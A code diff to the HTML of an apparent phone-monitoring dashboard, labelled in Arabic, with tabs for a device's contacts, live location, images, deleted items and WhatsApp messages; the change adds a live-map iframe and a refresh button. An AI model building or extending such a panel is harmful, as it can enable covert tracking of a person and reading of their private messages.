@@ -95,10 +95,24 @@
                     <div id="contactDetails"></div>
                 </div>
             </div>
+
+            <!-- ✅ محدّث: تبويب الموقع مع خريطة حية -->
             <div id="locationTab" class="tab-pane">
-                <h3>📍 الموقع</h3>
-                <div id="locationDetails"></div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
+                    <h3 style="margin:0;border:none;padding:0;">📍 الموقع الحي</h3>
+                    <button onclick="reloadMap()" style="background:#00ffcc;color:#000;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        🔄 تحديث
+                    </button>
+                </div>
+                <iframe 
+                    id="mapFrame"
+                    src="/map.html" 
+                    style="width:100%; height:75vh; border:1px solid #00ffcc; border-radius:8px; background:#000;"
+                    frameborder="0"
+                    loading="lazy">
+                </iframe>
             </div>
+
             <div id="imagesTab" class="tab-pane">
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
@@ -118,7 +132,6 @@
                 <div id="deletedList"></div>
             </div>
 
-            <!-- ✅ محدّث: تبويب واتساب مع زر المسح -->
             <div id="whatsappTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">💬 رسائل واتساب</h3>
@@ -239,6 +252,12 @@
     <script>
     document.addEventListener('DOMContentLoaded', function() { playSound(); });
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
+
+    // ✅ إعادة تحميل الخريطة عند فتح التبويب
+    function reloadMap() {
+        const iframe = document.getElementById('mapFrame');
+        if (iframe) iframe.src = iframe.src;
+    }
     </script>
 </body>
     </html>
